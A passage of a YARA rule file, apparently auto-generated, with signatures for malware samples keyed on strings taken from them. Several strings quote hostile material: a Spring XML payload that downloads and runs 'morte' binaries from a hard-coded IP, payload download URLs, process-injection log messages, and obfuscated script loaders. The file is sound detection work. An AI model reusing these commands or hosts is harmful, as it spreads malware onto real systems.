      $s12 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s13 = "/rustc/6b00bc3880198600130e1cf62b8f8a93494488cc\\library\\alloc\\src\\collections\\btree\\node.rsassertion failed: edge.height =" ascii /* score: '17.00'*/
      $s14 = "NetworkFileHandleInvalidInputInvalidDataTimedOutWriteZeroStorageFullNotSeekableQuotaExceededFileTooLargeResourceBusyExecutableFi" ascii /* score: '16.00'*/
      $s15 = "assertion failed: edge.height == self.node.height - 1" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_78776ce4ddfd7c5807c2f05081f259c7_imphash_ {
   meta:
      description = "_subset_batch - file 78776ce4ddfd7c5807c2f05081f259c7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "096e2d456e34c5ccdbc1c846978c40c67f615a64766154b0be62d94adb935a2a"
   strings:
      $s1 = "kernel32.dllLoadLibraryAGetProcAddressGetCurrentProcess/rustc/7d82b83ed57d188ab3f2441a765a6419685a88a3\\library\\core\\src\\ops" ascii /* score: '30.00'*/
      $s2 = "kernel32.dllLoadLibraryAGetProcAddressGetCurrentProcess/rustc/7d82b83ed57d188ab3f2441a765a6419685a88a3\\library\\core\\src\\ops" ascii /* score: '30.00'*/
      $s3 = "ntdll.dllNtAllocateVirtualMemoryNtProtectVirtualMemorymemexec-0.2.0\\src\\peparser\\header.rs" fullword ascii /* score: '25.00'*/
      $s4 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s5 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s6 = "shmk.pdb" fullword ascii /* score: '14.00'*/
      $s7 = "@http://secure.globalsign.com/cacert/gsgccr45evcodesignca2020.crt0?" fullword ascii /* score: '13.00'*/
      $s8 = "3http://ocsp.globalsign.com/gsgccr45evcodesignca20200U" fullword ascii /* score: '13.00'*/
      $s9 = "6http://crl.globalsign.com/gsgccr45evcodesignca2020.crl0" fullword ascii /* score: '13.00'*/
      $s10 = "memexec-0.2.0\\src\\peparser\\pe.rs" fullword ascii /* score: '12.00'*/
      $s11 = "memexec-0.2.0\\src\\peparser\\section.rs" fullword ascii /* score: '12.00'*/
      $s12 = "Local\\RustBacktraceMutex00000000" fullword ascii /* score: '11.00'*/
      $s13 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s14 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s15 = "(): /rustc/7d82b83ed57d188ab3f2441a765a6419685a88a3\\library\\core\\src\\str\\pattern.rs" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule sig_092b15564d5f9ae27c19d5bcac77d8ea_imphash_ {
   meta:
      description = "_subset_batch - file 092b15564d5f9ae27c19d5bcac77d8ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9aea0a84e91d8dc08896ad55aafd4623de2329fed2201abb48b27d709be15fe4"
   strings:
      $s1 = "invalid const void* type" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      all of them
}

rule sig_18019d96588e60dd9e4153aafae4d8aa_imphash_ {
   meta:
      description = "_subset_batch - file 18019d96588e60dd9e4153aafae4d8aa(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "08d1a298778633ed8bbb0c7e04724e0023d6494b2d7b996fbbce4843aeffa534"
   strings:
      $s1 = "EXECUT=/" fullword ascii /* score: '12.00'*/
      $s2 = "DXGIDeclareAdapterRemovalSupport" fullword ascii /* score: '10.00'*/
      $s3 = "GetValueS/;" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule sig_1e2930ebf5bcaa7614499178aa6f1f14_imphash_ {
   meta:
      description = "_subset_batch - file 1e2930ebf5bcaa7614499178aa6f1f14(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "65f37a817d1e61582e81cfaafcfb8c26947fb64eed0b465c585e346393553477"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "%SystemRoot%\\SysWoW64\\calc.exe" fullword wide /* score: '23.00'*/
      $s3 = "%SystemRoot%\\system32\\calc.exe" fullword wide /* score: '23.00'*/
      $s4 = "Process Ghosting test!" fullword wide /* score: '20.00'*/
      $s5 = "[+] Process created! Pid = " fullword ascii /* score: '19.00'*/
      $s6 = "RtlCreateProcessParametersEx failed" fullword ascii /* score: '18.00'*/
      $s7 = "NtCreateProcessEx failed! Status: " fullword ascii /* score: '18.00'*/
      $s8 = "Writing RemoteProcessParams failed" fullword ascii /* score: '18.00'*/
      $s9 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s10 = "Failed writing payload! Error: " fullword ascii /* score: '16.00'*/
      $s11 = "[+] Created temp file: " fullword ascii /* score: '15.00'*/
      $s12 = "Allocating RemoteProcessParams failed" fullword ascii /* score: '14.00'*/
      $s13 = "[!] The payload has mismatching bitness!" fullword ascii /* score: '13.00'*/
      $s14 = "[-] Failed!" fullword ascii /* score: '11.00'*/
      $s15 = "NtCreateThreadEx failed: " fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      8 of them
}

rule sig_553dc29d4ae5f8a0d9ae18157d9c440d_imphash_ {
   meta:
      description = "_subset_batch - file 553dc29d4ae5f8a0d9ae18157d9c440d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7a9b5d2c573344763ba94000fdc81a6c212e46bd7be8da61c296676c87a03615"
   strings:
      $x1 = "C:\\Users\\admin\\Desktop\\PAQUETE_IM\\Builder\\Panamera\\Panamera_Reborn_Loader\\DLL\\x64\\Release\\DLL.pdb" fullword ascii /* score: '47.00'*/
      $x2 = "c:\\windows\\system32\\auditpolcore.AdtGetSystemPolicy" fullword ascii /* score: '33.00'*/
      $x3 = "C:\\Windows\\System32\\nslookup.exe" fullword wide /* score: '32.00'*/
      $s4 = "c:\\windows\\system32\\auditpolcore.AdtGetPerUserPolicy" fullword ascii /* score: '29.00'*/
      $s5 = "gc:\\windows\\system32\\ctfmon.exe" fullword wide /* score: '29.00'*/
      $s6 = "c:\\windows\\system32\\auditpolcore.AdtSetSystemPolicy" fullword ascii /* score: '28.00'*/
      $s7 = "c:\\windows\\system32\\auditpolcore.AdtGetOption" fullword ascii /* score: '26.00'*/
      $s8 = "c:\\windows\\system32\\auditpolcore.GetDisplayPolicy" fullword ascii /* score: '26.00'*/
      $s9 = "c:\\windows\\system32\\auditpolcore.DisplayMessageToSpecificConsoleHandle" fullword ascii /* score: '26.00'*/
      $s10 = "c:\\windows\\system32\\auditpolcore.AdtSetPerUserPolicy" fullword ascii /* score: '24.00'*/
      $s11 = "RegQueryValueExANtWriteVirtualMeNtGetContextThreNtSetContextThreft\\Windows\\Currec:\\windows\\systeCryptDestroyHashNtReadVirtua" ascii /* score: '24.00'*/
      $s12 = "c:\\windows\\system32\\auditpolcore.AdtRemoveAllUsers" fullword ascii /* score: '24.00'*/
      $s13 = "c:\\windows\\system32\\auditpolcore.AdtEnableSinglePrivilege" fullword ascii /* score: '24.00'*/
      $s14 = "c:\\windows\\system32\\auditpolcore.AdtDisableSinglePrivilege" fullword ascii /* score: '24.00'*/
      $s15 = "GetPebCurrentProcess failed." fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_08e49e8e43a3de52bcb28c651a1237da_imphash_ {
   meta:
      description = "_subset_batch - file 08e49e8e43a3de52bcb28c651a1237da(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "720f939b4e9cc29cf0f9d4d90133f72cb35d6d3d56465f22414c48292b57e96c"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $x2 = "\\??\\C:\\Windows\\TEMP\\lsass.exe" fullword ascii /* score: '33.00'*/
      $s3 = "C:\\Windows\\System32\\notepad.exe" fullword ascii /* score: '29.00'*/
      $s4 = "C:\\Windows\\TEMP\\gianni3.exe" fullword ascii /* score: '28.00'*/
      $s5 = "C:\\Windows\\TEMP\\gianni0.exe" fullword ascii /* score: '28.00'*/
      $s6 = "C:\\Windows\\TEMP\\gianni2.exe" fullword ascii /* score: '28.00'*/
      $s7 = "C:\\Windows\\TEMP\\gianni4.exe" fullword ascii /* score: '28.00'*/
      $s8 = "C:\\Windows\\TEMP\\finalStage.exe" fullword ascii /* score: '28.00'*/
      $s9 = "C:\\Windows\\TEMP\\gianni1.exe" fullword ascii /* score: '28.00'*/
      $s10 = "\\??\\C:\\Windows\\System32\\calc.exe" fullword wide /* score: '26.00'*/
      $s11 = "Win32_Process" fullword ascii /* score: '15.00'*/
      $s12 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" fullword ascii /* score: '13.00'*/
      $s13 = "LoadKey failed." fullword ascii /* score: '10.00'*/
      $s14 = "Base64 decode failed." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_188b672c365c42fe892ba4bf2cc59074_imphash_ {
   meta:
      description = "_subset_batch - file 188b672c365c42fe892ba4bf2cc59074(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "af7ee2fde8a7fb37e31e499f7dd7add82b57e018811bcf6803ab1b8caf4b1661"
   strings:
      $s1 = "\\??\\C:\\Windows\\System32\\calc.exe" fullword wide /* score: '26.00'*/
      $s2 = "http://ocsp.digicert.com0]" fullword ascii /* score: '14.00'*/
      $s3 = "Nhttp://crl3.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crl0 " fullword ascii /* score: '13.00'*/
      $s4 = "Qhttp://cacerts.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crt0_" fullword ascii /* score: '13.00'*/
      $s5 = "LoadKey failed." fullword ascii /* score: '10.00'*/
      $s6 = "Base64 decode failed." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule sig_680729bc6bfb9c6db34d23d1804abe46_imphash_ {
   meta:
      description = "_subset_batch - file 680729bc6bfb9c6db34d23d1804abe46(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "308b461795032457b5e8230cd9728067c096113ca56bfa517b642d506225877d"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "LoadKey failed." fullword ascii /* score: '10.00'*/
      $s3 = "Base64 decode failed." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule sig_5b350062cf98db9466fd700efbd86f21_imphash_ {
   meta:
      description = "_subset_batch - file 5b350062cf98db9466fd700efbd86f21(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "59a651dfce580d28d17b2f716878a8eff8d20152b364cf873111451a55b7224d"
   strings:
      $s1 = "C:\\Windows\\Temp\\TMP01.dat" fullword ascii /* score: '24.00'*/
      $s2 = "IGFXPRVC.EXE" fullword wide /* score: '22.00'*/
      $s3 = "\\tmpntl.dat" fullword ascii /* score: '15.00'*/
      $s4 = "ntkernel" fullword ascii /* score: '13.00'*/
      $s5 = "igfxprvc" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule sig_05a8017f70a33860398bd8498efeeca6_imphash_ {
   meta:
      description = "_subset_batch - file 05a8017f70a33860398bd8498efeeca6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "50b6828abaa487cddb055699b82fc20b790d35f6b814ae4fc6658126d5f6ec9d"
   strings:
      $s1 = "http://xteam.space/update.exe" fullword ascii /* score: '22.00'*/
      $s2 = "\\%d.tmp" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      all of them
}

rule sig_1a2c6c953a3c96df6769899324d1ff90_imphash_ {
   meta:
      description = "_subset_batch - file 1a2c6c953a3c96df6769899324d1ff90(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b2fcef0757d618e1e8fb107096d2c4b65855eb3e16021206ccb5c4f03fcac3"
   strings:
      $s1 = "http://176.46.152.62:5858/dd4517d760bb43ffaf57b426808fc91d_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s3 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule sig_4da734235f66083ee0ccb2357fe1f7ee_imphash_ {
   meta:
      description = "_subset_batch - file 4da734235f66083ee0ccb2357fe1f7ee(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1c79d02819eade0c7cbc746a9667a5fdbf7bc773f264bb05a7832417ce67408c"
   strings:
      $s1 = "waitforsingleobject" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule sig_12a08f9abccb8da4f51973e195c06c84c62a96e607db7d43559c1e97fe12d4ce_12a08f9a {
   meta:
      description = "_subset_batch - file 12a08f9abccb8da4f51973e195c06c84c62a96e607db7d43559c1e97fe12d4ce_12a08f9a.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "12a08f9abccb8da4f51973e195c06c84c62a96e607db7d43559c1e97fe12d4ce"
   strings:
      $s1 = "Execute \"Trachoma.\" + Ekes & \"Exe\" & chr(99) & \"ute Qophs,Insincere,Ufarligt,Vitriolically ,Tegneseriemestre\"" fullword ascii /* score: '18.00'*/
      $s2 = "Unconcealableness = Unconcealableness + \"Y]YYYY:\"" fullword ascii /* score: '17.00'*/
      $s3 = "If Bycenterprocessi = cstr(1472920) Then " fullword ascii /* score: '15.00'*/
      $s4 = "Unconcealableness = Unconcealableness + \"w: www:\"" fullword ascii /* score: '14.00'*/
      $s5 = "Unconcealableness = Unconcealableness + \"AIIIILI II:\"" fullword ascii /* score: '14.00'*/
      $s6 = "Unconcealableness = Unconcealableness + \"jLjjjj:\"" fullword ascii /* score: '14.00'*/
      $s7 = "Spytkrllensseksuelles = Spytkrllensseksuelles * (1+1)" fullword ascii /* score: '13.00'*/
      $s8 = "Wscript.Sleep 100" fullword ascii /* score: '13.00'*/
      $s9 = "Unconcealableness = Unconcealableness + \"Get-D\"" fullword ascii /* score: '13.00'*/
      $s10 = "Unconcealableness = Unconcealableness + \"e!!!!\"" fullword ascii /* score: '13.00'*/
      $s11 = "Unconcealableness = Unconcealableness + \". !!!w\"" fullword ascii /* score: '13.00'*/
      $s12 = "Unconcealableness = Unconcealableness + \" '!!!!n!!!!\"" fullword ascii /* score: '13.00'*/
      $s13 = "Unconcealableness = Unconcealableness + \"T !!!\"" fullword ascii /* score: '13.00'*/
      $s14 = "Set Daisybush = GetObject(\"w\"+\"inmgmts://./root/default:StdRegProv\")" fullword ascii /* score: '12.00'*/
      $s15 = "Kingpiecekeglehatteskon = Kingpiecekeglehatteskon - 1584029 " fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x7553 and filesize < 100KB and
      8 of them
}

rule sig_59e82f568be780decbf635ea2d441bda_imphash_ {
   meta:
      description = "_subset_batch - file 59e82f568be780decbf635ea2d441bda(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9a8142df15c72df9981623d8876f1526dcdd79e95dcbec57025a2dfadc372da1"
   strings:
      $s1 = "_U\\\\.\\pipe\\%08X%016ll" fullword ascii /* score: '18.00'*/
      $s2 = "ReflectiveLoader" fullword ascii /* score: '13.00'*/
      $s3 = "?TempPath" fullword ascii /* score: '11.00'*/
      $s4 = "* 8s?b1fw" fullword ascii /* score: '9.00'*/
      $s5 = "GetConsoleMod" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule sig_3e50c7f720bc716fc850bee2ee0cca46c56843f36d8cd76269401e87e29bf684_3e50c7f7 {
   meta:
      description = "_subset_batch - file 3e50c7f720bc716fc850bee2ee0cca46c56843f36d8cd76269401e87e29bf684_3e50c7f7.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3e50c7f720bc716fc850bee2ee0cca46c56843f36d8cd76269401e87e29bf684"
   strings:
      $x1 = "%POSH% -Command \"$p = (Get-WmiObject Win32_Process -Filter ProcessId=$ofsee).ParentProcessId; (Get-WmiObject Win32_Process -Fil" ascii /* score: '35.00'*/
      $x2 = "%POSH% -Command \"$p = (Get-WmiObject Win32_Process -Filter ProcessId=$ofsee).ParentProcessId; (Get-WmiObject Win32_Process -Fil" ascii /* score: '35.00'*/
      $x3 = "if not defined wsogival.ini.command set wsogival.ini.command=%WINDIR%\\system32\\cscript.exe //NoLogo" fullword ascii /* score: '34.00'*/
      $x4 = "echo.new ActiveXObject^('Scripting.FileSystemObject'^).DeleteFile^('!wsogival.execute:\\=\\\\!'^);" fullword ascii /* score: '33.00'*/
      $x5 = "if not defined wsogival.ini.execute set \"wsogival.ini.execute=%TEMP%\\$$$%~n0_$UID.wsf\"" fullword ascii /* score: '32.00'*/
      $x6 = "for /f %%d in ( '%POSH% -Command \"Get-Date -UFormat '%%H%%M%%S'\" ^<nul' ) do (" fullword ascii /* score: '31.00'*/
      $s7 = "%wsogival.ini.command% \"%wsogival.execute%\" %wsogival.args%" fullword ascii /* score: '29.00'*/
      $s8 = "echo.    command=%%windir%%\\system32\\cscript.exe //nologo" fullword ascii /* score: '29.00'*/
      $s9 = "set WMIC=%windir%\\System32\\Wbem\\wmic.exe" fullword ascii /* score: '27.00'*/
      $s10 = "set FIND=%windir%\\System32\\find.exe" fullword ascii /* score: '27.00'*/
      $s11 = "set GREP=%windir%\\System32\\findstr.exe" fullword ascii /* score: '27.00'*/
      $s12 = "echo.    /compile     - Compile but not execute. Just store to a temporary file" fullword ascii /* score: '26.00'*/
      $s13 = "if /i \"%~x1\" == \".vbs\" set wsogival.engine=vbscript" fullword ascii /* score: '25.00'*/
      $s14 = "'%WMIC% Process call create \"%windir%\\System32\\wscript.exe //b\" 2^>nul'" fullword ascii /* score: '25.00'*/
      $s15 = "call :wsogival.execute.find.powershell powershell.exe" fullword ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x6572 and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule sig_06273f12407f806c9225b90e0191839a7dcbb48aa5d84d320fbbad41e084941a_06273f12 {
   meta:
      description = "_subset_batch - file 06273f12407f806c9225b90e0191839a7dcbb48aa5d84d320fbbad41e084941a_06273f12.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "06273f12407f806c9225b90e0191839a7dcbb48aa5d84d320fbbad41e084941a"
   strings:
      $s1 = "                <value>rm -rf morte.x86; curl --output morte.x86 http://193.32.162.27/00101010101001/morte.x86; wget http://193." ascii /* score: '19.00'*/
      $s2 = "                <value>rm -rf morte.x86; curl --output morte.x86 http://193.32.162.27/00101010101001/morte.x86; wget http://193." ascii /* score: '16.00'*/
      $s3 = "<beans xmlns=\"http://www.springframework.org/schema/beans\"" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x623c and filesize < 2KB and
      all of them
}

rule sig_1f6d442e4dad4f7525b82d012f0b13efafb4cf4ffe5b39191b7420d9a4cb90b4_1f6d442e {
   meta:
      description = "_subset_batch - file 1f6d442e4dad4f7525b82d012f0b13efafb4cf4ffe5b39191b7420d9a4cb90b4_1f6d442e.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1f6d442e4dad4f7525b82d012f0b13efafb4cf4ffe5b39191b7420d9a4cb90b4"
   strings:
      $s1 = "                <value>rm morte.x86; curl --output morte.x86 http://193.32.162.27/00101010101001/morte.x86; wget http://193.32.1" ascii /* score: '19.00'*/
      $s2 = "                <value>rm morte.x86; curl --output morte.x86 http://193.32.162.27/00101010101001/morte.x86; wget http://193.32.1" ascii /* score: '16.00'*/
      $s3 = "<beans xmlns=\"http://www.springframework.org/schema/beans\"" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x623c and filesize < 2KB and
      all of them
}

rule sig_7eceff81d7ba3b8a12d93221b1f564d8835b339669a382800f47df159159e17d_7eceff81 {
   meta:
      description = "_subset_batch - file 7eceff81d7ba3b8a12d93221b1f564d8835b339669a382800f47df159159e17d_7eceff81.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7eceff81d7ba3b8a12d93221b1f564d8835b339669a382800f47df159159e17d"
   strings:
      $s1 = "                <value>rm -rf morte.mips; curl --output morte.mips http://193.32.162.27/00101010101001/morte.mips; wget http://1" ascii /* score: '19.00'*/
      $s2 = "                <value>rm -rf morte.mips; curl --output morte.mips http://193.32.162.27/00101010101001/morte.mips; wget http://1" ascii /* score: '16.00'*/
      $s3 = "<beans xmlns=\"http://www.springframework.org/schema/beans\"" fullword ascii /* score: '13.00'*/
      $s4 = "93.32.162.27/00101010101001/morte.mips; chmod 777 morte.mips; ./morte.mips morte.mips;</value>" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x623c and filesize < 2KB and
      all of them
}

rule sig_453ffaa4b93d44f9fdec327e92740ba2b9ed6e080df9b6c0834a79c8fa34e9f7_453ffaa4 {
   meta:
      description = "_subset_batch - file 453ffaa4b93d44f9fdec327e92740ba2b9ed6e080df9b6c0834a79c8fa34e9f7_453ffaa4.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "453ffaa4b93d44f9fdec327e92740ba2b9ed6e080df9b6c0834a79c8fa34e9f7"
   strings:
      $s1 = "Xeno-v1.2.65/WebView2Loader.dll" fullword ascii /* score: '29.00'*/
      $s2 = "Xeno-v1.2.65/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s3 = "Xeno-v1.2.65/vcruntime140_1.dll" fullword ascii /* score: '23.00'*/
      $s4 = "Xeno-v1.2.65/api-ms-win-crt-runtime-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "Xeno-v1.2.65/vcruntime140.dll" fullword ascii /* score: '23.00'*/
      $s6 = "Xeno-v1.2.65/api-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s7 = "Xeno-v1.2.65/msvcrt.dll" fullword ascii /* score: '20.00'*/
      $s8 = "Xeno-v1.2.65/msvcp140_1.dll" fullword ascii /* score: '20.00'*/
      $s9 = "Xeno-v1.2.65/concrt140.dll" fullword ascii /* score: '20.00'*/
      $s10 = "Xeno-v1.2.65/ucrtbase.dll" fullword ascii /* score: '20.00'*/
      $s11 = "Xeno-v1.2.65/api-ms-win-crt-stdio-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "Xeno-v1.2.65/api-ms-win-crt-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Xeno-v1.2.65/api-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "Xeno-v1.2.65/Microsoft.Web.WebView2.Core.dll" fullword ascii /* score: '20.00'*/
      $s15 = "Xeno-v1.2.65/Microsoft.Web.WebView2.Wpf.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 19000KB and
      8 of them
}

rule sig_1d8915c3554f512929a8d501df563d33_imphash_ {
   meta:
      description = "_subset_batch - file 1d8915c3554f512929a8d501df563d33(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9a5573bac8d5aa29f1b04d857cade0c0197542da1ac870c2a42dba1c832969ca"
   strings:
      $x1 = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"" fullword wide /* score: '51.00'*/
      $x2 = "Writing payload DLL to target process." fullword ascii /* score: '34.00'*/
      $s3 = "Failed to determine target process architecture." fullword ascii /* score: '28.00'*/
      $s4 = "Allocating memory for payload in target process." fullword ascii /* score: '25.00'*/
      $s5 = "GetModuleHandleW for ntdll.dll failed." fullword ascii /* score: '24.00'*/
      $s6 = "Creating new thread in target to execute ReflectiveLoader." fullword ascii /* score: '23.00'*/
      $s7 = "Post-processing error: " fullword ascii /* score: '23.00'*/
      $s8 = "Waiting for payload execution. (Pipe: " fullword ascii /* score: '22.00'*/
      $s9 = "brave.exe" fullword wide /* score: '22.00'*/
      $s10 = "msedge.exe" fullword wide /* score: '22.00'*/
      $s11 = "NtWriteVirtualMemory for payload DLL failed: " fullword ascii /* score: '21.00'*/
      $s12 = "Loading and decrypting payload DLL." fullword ascii /* score: '20.00'*/
      $s13 = "Failed to load rpcrt4.dll. Error: " fullword ascii /* score: '19.00'*/
      $s14 = "Waiting for payload to connect to named pipe." fullword ascii /* score: '19.00'*/
      $s15 = "Payload connected to named pipe." fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule sig_1e6035a07cd2c3200e52a9fac514dd74_imphash_ {
   meta:
      description = "_subset_batch - file 1e6035a07cd2c3200e52a9fac514dd74(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d80b48164a6b58e668314e363b76fcb6ca1224aefde7c7bbc32b6e1b1b483a2a"
   strings:
      $s1 = "Bcrypt.dll" fullword ascii /* score: '23.00'*/
      $s2 = "10.log(base e)" fullword ascii /* score: '16.00'*/
      $s3 = "11.log(base 10)" fullword ascii /* score: '16.00'*/
      $s4 = "23.Combination (nCr)" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      all of them
}

rule sig_7af475d33b2e7e3ebdead03e48c6ef96_imphash_ {
   meta:
      description = "_subset_batch - file 7af475d33b2e7e3ebdead03e48c6ef96(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e944e8624a61d010fffdaa350c33a2d5152511fd991be11e348d6ebaae117ed0"
   strings:
      $s1 = "C:\\Users\\Juan Perez\\source\\repos\\Mordecai\\x64\\Release\\Mordecai.pdb" fullword ascii /* score: '29.00'*/
      $s2 = "https://31.220.98.114/msys-2.0.dll" fullword wide /* score: '28.00'*/
      $s3 = "AppData\\Local\\Temp\\msys-2.0.dll" fullword wide /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule sig_373ca2f299acaf012ed9dfbae70579e10f49d881f669ef215e6d611faa78c818_373ca2f2 {
   meta:
      description = "_subset_batch - file 373ca2f299acaf012ed9dfbae70579e10f49d881f669ef215e6d611faa78c818_373ca2f2.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "373ca2f299acaf012ed9dfbae70579e10f49d881f669ef215e6d611faa78c818"
   strings:
      $s1 = "kwfJxR7I9cWVPL5v8UzXgzB0JEPiEYSt66e4ZveoFJThon317H1ypgaNbYX8pe9fGRhZFn3St4jBoN08o0Sy3LaQKjqWismtJEWTNrTOcPF4pNudcdPbcBGgiDYydI4M" ascii /* score: '11.00'*/
      $s2 = "owq9RNlupXcfvLBICBo9il2uP1YniRQuObYsatMnAVjGHnEtDiZsTaIt4AlF8qGGkFawzuepJLV92HRDJEa63BTQLg4c23yFVuodmz3nt4paNKF39ml4b6xHucPCZZxc" ascii /* score: '11.00'*/
      $s3 = "?(]>`-^@20&@<5_6+-7[&4" fullword ascii /* score: '9.00'*/ /* hex encoded string ' Vt' */
      $s4 = "7#^|-0<[?5.1@@!" fullword ascii /* score: '9.00'*/ /* hex encoded string 'pQ' */
      $s5 = ">??+:3@>0:*:*?_5|6+<(_$|`=*53,-+:&<`6*-;?=423|%*?]" fullword ascii /* score: '9.00'*/ /* hex encoded string '0VSd#' */
      $s6 = "2_13!?.)/15;0#!(|" fullword ascii /* score: '9.00'*/ /* hex encoded string '!1P' */
      $s7 = "|/_:4-|?3'-" fullword ascii /* score: '9.00'*/ /* hex encoded string 'C' */
      $s8 = "39-]#(_==/67`[24" fullword ascii /* score: '9.00'*/ /* hex encoded string '9g$' */
      $s9 = "+#6+?[9~?<" fullword ascii /* score: '9.00'*/ /* hex encoded string 'i' */
      $s10 = "{\\*\\aexpnd250600274 \\bin00000\\eGwUoDlYbIlrfflIrVwwiweYperTOkwBq}" fullword ascii /* score: '9.00'*/
      $s11 = "*3?#;(?+:|>|&>5/_5(%??>$&_-)(3" fullword ascii /* score: '9.00'*/ /* hex encoded string '5S' */
      $s12 = "*?*?#6;#)!+~|_5?6'/:.7!=6'?)>=~?7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'egg' */
      $s13 = "2!:?,;?>8)" fullword ascii /* score: '9.00'*/ /* hex encoded string '(' */
